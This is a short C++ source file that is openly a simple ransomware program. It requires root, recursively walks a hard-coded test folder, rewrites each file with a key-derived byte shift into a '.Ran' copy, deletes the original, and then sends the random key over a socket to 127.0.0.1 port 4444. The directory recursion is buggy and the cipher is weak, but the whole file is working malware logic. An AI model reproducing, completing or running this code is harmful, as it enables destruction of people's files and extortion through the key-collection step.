#include <iostream>
#include <unistd.h>
#include <fstream>
#include <string>
#include <filesystem>
#include <arpa/inet.h>

void encrypt(std::string path, int key)
{
    std::string newPath = path + ".Ran";
    std::fstream file(path, std::ios::in | std::ios::binary);
    std::fstream newFile(newPath, std::ios::out | std::ios::binary);

    file.seekg(0, file.end);
    int size = file.tellg();
    file.seekg(0, file.beg);

    char buffer[size];

    file.read(buffer, size);

    for(int i = 0; i < size; i++)
    {
        buffer[i] += key / 10;
    }

    newFile.write(buffer, size);
    file.close();
    newFile.close();

    remove(path.c_str());
}

void encryptDir(std::string path, int key)
{
    for(auto file : std::filesystem::directory_iterator(path))
    {
        if(file.is_directory())
        {
            encryptDir(path, key);
        }
        else
        {
            encrypt(file.path(), key);
        }
    }
}

int main() {
    auto priv = geteuid();

    if(priv != 0)
    {
        std::cout << "Must run with root privilages" << std::endl;
        return 0;
    }

    srand((unsigned)time(0));

    int key = rand();
    std::cout << key << std::endl;

    std::string startDir = "/home/eap2004/Rantest/";

    encryptDir(startDir, key);

    const char* ip = "127.0.0.1";
    short port = 4444;

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_port = htons(port);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    for(;;)
    {
        int connectError = connect(sockfd, (const sockaddr*)&addr, sizeof(addr));
        if(connectError == 0)
        {
            break;
        }
        sleep(5000);
    }

    std::string keyStr = std::to_string(key);
    send(sockfd, keyStr.c_str(), keyStr.length(), 0);
    close(sockfd);

    return 0;
}
